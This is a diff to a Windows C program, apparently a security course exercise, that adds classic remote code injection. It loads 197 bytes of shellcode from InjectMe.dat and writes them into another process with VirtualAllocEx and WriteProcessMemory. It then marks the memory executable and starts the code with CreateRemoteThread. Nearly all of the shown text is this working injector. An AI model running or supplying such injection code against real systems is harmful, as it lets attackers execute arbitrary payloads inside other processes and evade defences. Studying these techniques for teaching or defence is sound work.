@@ -40,7 +40,7 @@ void _die(char * arg) {
 BOOL _isProcessNamed(DWORD processID, const char * name) {
 	char processName[MAX_PATH];
 	processName[0] = NULL;
-	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
 	if (hProcess != NULL) {
 		HMODULE hMod;
 		DWORD cbNeeded;
@@ -88,7 +88,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	fopen_s(&f, "c:\\temp.txt", "a");
 	fprintf(f, "pid: %d\n", pid);
 	fclose(f);
-	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
+	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
 	if (process == NULL) {
 		_die("Failed to OpenProcess !");
 	}
@@ -96,11 +96,50 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	fprintf(f, "pHandle: %d\n", process);
 	fclose(f);
 
-	LPVOID address = VirtualAllocEx(process, NULL, 111, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	FILE* inject = NULL;
+	byte buf[197];
+	int ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
+	if (NULL != ret){
+
+		_die("Failed to open InjectMe !");
+	}
+	size_t bytesRead = fread(buf,1,197,inject);
+	if (197 != bytesRead){
+		_die("Failed to read enough !");
+	}
+	
+	fclose(inject);
+
+	LPVOID address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_READWRITE);
 	if (address == NULL) {
 		CloseHandle(process);
 		_die("Failed to VirtualAllocEx !");
 	}
+
+	SIZE_T bytesWritten = 0;
+	BOOL wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
+	if (NULL == wrote){
+		_die("Failed to write memory !");
+	}
+	if (bytesWritten != sizeof(buf)){
+		_die("Failed to write enough memory !");
+	}
+	DWORD oldProtect = NULL;
+	BOOL changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READ,&oldProtect);
+	if (!changed){
+				int err = GetLastError();
+		fopen_s(&f, "c:\\temp.txt", "a");
+		fprintf(f, "err: %d\n", err);
+		fclose(f);
+		_die("Failed to change permission!");
+
+	}
+
+	HANDLE hThread = CreateRemoteThread(process,NULL,NULL,(LPTHREAD_START_ROUTINE)address,NULL,NULL,NULL);
+	if (NULL == hThread){
+		_die("Failed to create remote thread !");
+	}
+
 	BOOL freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
 	if (!freeOK) {
 		CloseHandle(process);
@@ -133,4 +172,3 @@ int _tmain(int argc, _TCHAR* argv[]) {
 */
 	return 0;
 }
-
